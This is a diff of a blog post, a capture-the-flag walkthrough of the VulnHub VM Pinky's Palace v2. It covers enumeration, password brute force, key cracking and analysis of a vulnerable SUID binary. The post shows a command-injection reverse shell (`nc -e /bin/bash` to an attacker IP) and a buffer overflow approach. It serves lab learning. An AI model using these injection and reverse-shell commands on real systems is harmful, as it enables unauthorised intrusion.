@@ -1,21 +1,29 @@
 ---
 layout: post
-title:  "Pinky's Palace siege"
-subtitle: "inviting yourself to a party of pinky"
-categories: [itsec,English,CTF,vulnhub]
+title: Pinky's Palace siege
+subtitle: inviting yourself to a party of pinky
+categories: [itsec, English, CTF, vulnhub]
 ---
 
-![](https://i.imgur.com/jwTfV6K.png)
+![1.00](https://i.imgur.com/jwTfV6K.png)
+
+<br />
 
 I want to write about [this VM](https://www.vulnhub.com/entry/pinkys-palace-v2,229/) because, for me, it was one of the best I ever resolved. Really nice way to make your way through it. Also it isn't that easy, containing flaws from false programmed programs you have to mention.
 Let's start.
+
+<br />
 
 Note: You have to change your `/etc/hosts` file according VulnHub:
 
 `echo 192.168.x.x pinkydb | sudo tee -a /etc/hosts`
 
 * Will be replaced with the ToC, excluding the "Contents" header
-{:toc}
+  {:toc}
+
+<br />
+
+<br />
 
 ## Enumeration
 
@@ -52,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds
 
 Only open port for now is `:80`. The other ones seem to be behind a firewall.
 
-![img](https://i.imgur.com/2i60AfE.png)
+![1.00](https://i.imgur.com/2i60AfE.png)
 
 Looks like Wordpress, let's scan it with `wpscan`.  There I didn't any really useful vuln.
 
@@ -229,7 +237,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 85.07 seconds
 ```
 
-Yeah, I know. Many CLI copy paste. But I just want you to understand how my way was to beat that VM. Anyways. 
+Yeah, I know. Many CLI copy paste. But I just want you to understand how my way was to beat that VM. Anyways.
 SSH is now open, we see also another HTTPd. And on 31337 an unkown service.
 
 ```shell
@@ -241,8 +249,8 @@ into Pinky's Palace.
 help
 ```
 
-Hmm 🤔. Not sure what that is, so let's focus on the other services. The new HTTP service shows us a login page. I created a user list file, standard usernames and guessed ones:
-(yes I tested also for SQLi, with no success. If you find a way to SQLi please message me 😉)
+Hmm :thinking:. Not sure what that is, so let's focus on the other services. The new HTTP service shows us a login page. I created a user list file, standard usernames and guessed ones:
+(yes I tested also for SQLi, with no success. If you find a way to SQLi please message me :wink:)
 
 ```
 root
@@ -266,8 +274,8 @@ root@kali:~/vulnhub/pinkypalace# patator http_fuzz url=http://pinkydb:7654/login
 
 ## Getting user
 
-So, password is `Passione`.  After logging if we see a private RSA key and some notes. This looks like a SSH key to login. Let's try it on port 4655, where SSH listens. It has a password, so we have to brute force it first, for that I'm using that tool: [rsakey-cracker](https://github.com/quarantin/rsakey-cracker). As wordlist I use `rockyou.txt`. And we have it: `Passphrase is: secretz101`. 
-For the future use I removed the password from the key. 
+So, password is `Passione`.  After logging if we see a private RSA key and some notes. This looks like a SSH key to login. Let's try it on port 4655, where SSH listens. It has a password, so we have to brute force it first, for that I'm using that tool: [rsakey-cracker](https://github.com/quarantin/rsakey-cracker). As wordlist I use `rockyou.txt`. And we have it: `Passphrase is: secretz101`.
+For the future use I removed the password from the key.
 
 Inside the home folder is a executable named `qsub`, it has a SUID for the user *pinky* set. Only `pinky` or `www-data` are having permissions to it. As for now, we didn't find any way to get access as `pinky`. So let's focus on `www-data`.
 
@@ -343,11 +351,11 @@ subsys   linux
 va       true
 ```
 
-Thankfully not stripped 😁. We see where main() starts, imports, strings, information about the ELF. There are some interesting strings, to see how they are used I am doing a static analysis. Don't see this as full tutorial on how to reverse engineer, I will just describe details of the ELF. For static analysis I use [radare2](https://rada.re/r/), it's free and really powerful.
+Thankfully not stripped :grin:. We see where main() starts, imports, strings, information about the ELF. There are some interesting strings, to see how they are used I am doing a static analysis. Don't see this as full tutorial on how to reverse engineer, I will just describe details of the ELF. For static analysis I use [radare2](https://rada.re/r/), it's free and really powerful.
 
 Here is main:
 
-```r2
+```
 
             ;-- main:
 ┌ (fcn) sym.main 307
@@ -445,13 +453,13 @@ Here is main:
 
 And here a flow chart:
 
-![](https://i.imgur.com/bErog47.png)
+![1.00](https://i.imgur.com/bErog47.png)
 
 So what it does?
 
 First it checks if arguments are given, if not, a usage help is printed and the program exists. Otherwise it asks for a password then. Let's see what the password is.
 
-```r2
+```
 0x00000ad1      488d3dc30100.  rdi = str.TERM              ; 0xc9b ; "TERM" ; const char *name
 0x00000ad8      e873fdffff     sym.imp.getenv ()           ; char *getenv(const char *name)
 0x00000add      488945f8       qword [s2] = rax
@@ -467,7 +475,7 @@ First it checks if arguments are given, if not, a usage help is printed and the 
 
 `s2` is set to the string from the environment variable `TERM`. `s1` is set to the password input.
 
-```r2
+```
     0x00000b11      e86afdffff     sym.imp.strlen ()           ; size_t strlen(const char *s)
     0x00000b16      4883f828       var = rax - 0x28            ; '('
 ┌─< 0x00000b1a      7616           if (((unsigned) var) <= 0) goto 0xb32
@@ -482,7 +490,7 @@ First it checks if arguments are given, if not, a usage help is printed and the 
 
 Checking if the password string is bigger than 40 (0x28 is hexadecimal, decimal is 40) chars. If yes, exit. If no, continue.
 
-```r2
+```
 │       └─> 0x00000b32      488b55f8       rdx = qword [s2]
 │           0x00000b36      488d45b0       rax = [s1]
 │           0x00000b3a      4889d6         rsi = rdx                   ; const char *s2
@@ -501,13 +509,15 @@ Checking if the password string is bigger than 40 (0x28 is hexadecimal, decimal 
 │      │    0x00000b6d      e89efdffff     sym.imp.exit ()             ; void exit(int status)
 ```
 
+<br />
+
 Here it compares `s1` with `s2`. So when the given password is the `$TERM` string it continues. Otherwise an error is prompted and the program exists.
 
-I will skip the `uid` and `gid` part as it just sets the group and user id for the file which will be created then (spoiler eh? 😜).
+I will skip the `uid` and `gid` part as it just sets the group and user id for the file which will be created then (spoiler eh? :stuck\_out\_tongue\_winking\_eye:).
 
-It calls the function `sym.send` then. 
+It calls the function `sym.send` then.
 
-```r2
+```
 ┌ (fcn) sym.send 55
 │   sym.send (int arg1);
 │           ; var int local_18h @ rbp-0x18
@@ -532,11 +542,13 @@ It calls the function `sym.send` then.
 └           0x00000a96      c3             return
 ```
 
-It takes the argument which we used to call the program and put's it in another string: 
+It takes the argument which we used to call the program and put's it in another string:
 
 ```
 /bin/echo %s >> /home/pinky/messages/stefano_msg.txt
 ```
+
+<br />
 
 This string will be used as system command (`sym.imp.system`). There is no buffer overflow as it uses `asprintf` which dynamically associates the buffer based on the string length.
 
@@ -559,7 +571,7 @@ That worked! As we also see, the file has owner info UID pinky and GID stefano (
 
 Good for us `nc` has the `-e` option on that machine, that makes it a bit easier. A simple reverse shell can be spawned via `qsub` in that way: `./qsub ";nc -e /bin/bash 10.20.20.135 4444"`. And voila, we have a connection.
 
-We are having access as pinky now. After some enumeration I mentioned that this user has write permissions to the file `/usr/local/bin/backup.sh`. The problem is that the group is wrong and we cannot really access it. This occurs because of the file we use to gain a reverse shell. A workaround is to gain directly access via SSH as pinky. Checking first if pinky is allowed to login: 
+We are having access as pinky now. After some enumeration I mentioned that this user has write permissions to the file `/usr/local/bin/backup.sh`. The problem is that the group is wrong and we cannot really access it. This occurs because of the file we use to gain a reverse shell. A workaround is to gain directly access via SSH as pinky. Checking first if pinky is allowed to login:
 
 ```
 stefano:x:1002:1002::/home/stefano:/bin/bash
@@ -587,7 +599,7 @@ A connection will pop up. We have access as demon now. Searching for files owned
 
 ### 2nd binary
 
-Let's gain some infos: 
+Let's gain some infos:
 
 ```
 ELF Header:
@@ -912,16 +924,18 @@ panel:
 
 Flow of main function:
 
-![](https://i.imgur.com/romBY73.png)
+![1.00](https://i.imgur.com/romBY73.png)
 
 The binary creates a TCP server and listens for connections (the port is 31337, assigned here: `0x00400a37      bf697a0000     edi = 0x7a69 `). If a connection is made a text will be sent and then it waits for input. When the input is sent it just sends it back. As you might have mentioned, it appears to be the program which is listening on the box at 31337. As it says, this might be the backdoor for root.
 
 I see that a buffer is created for the input:
-```r2
+
+```
 0x00400b39      b900000000     ecx = 0
 0x00400b3e      ba00100000     edx = 0x1000
 0x00400b43      89c7           edi = eax
 ```
+
 We see that there is no protection against too long inputs. Let's do it dynamically to get known on how to abuse that buffer overflow. I use gdb with [peda](https://github.com/longld/peda), which is a great tool to do these things.
 
 <script src="https://asciinema.org/a/McjE8Q6CpuKxCjfF0SYhATu5e.js" id="asciicast-McjE8Q6CpuKxCjfF0SYhATu5e" async></script>
@@ -991,9 +1005,8 @@ And we solved this CTF.
 
 ## Conclusion
 
-I really enjoyed this CTF. It began rather simple and got kind hard in the end. It teached me how to use peda 😁!
+I really enjoyed this CTF. It began rather simple and got kind hard in the end. It teached me how to use peda :grin:!
 
 Also it shows how important it is to code securely. Not testing buffer is kinda bad thing, even more when you use it in a listening service.
 
-So, next it Pinky's Palace v3 I think 😄
-
+So, next it Pinky's Palace v3 I think :smile:
